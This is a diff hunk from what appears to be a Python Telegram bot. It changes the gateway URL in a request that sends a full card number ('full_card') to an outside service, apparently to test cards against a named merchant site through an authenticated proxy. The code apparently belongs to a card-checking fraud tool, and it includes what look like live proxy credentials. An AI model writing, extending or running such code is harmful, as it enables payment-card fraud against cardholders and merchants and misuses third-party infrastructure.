@@ -3146,7 +3146,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://auto-authnet-gateway.onrender.com/index.php"
+            f"https://auto-shopify-6cz4.onrender.com/index.php"
             f"?site=https://trimleaf.ca"
             f"&cc={full_card}"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
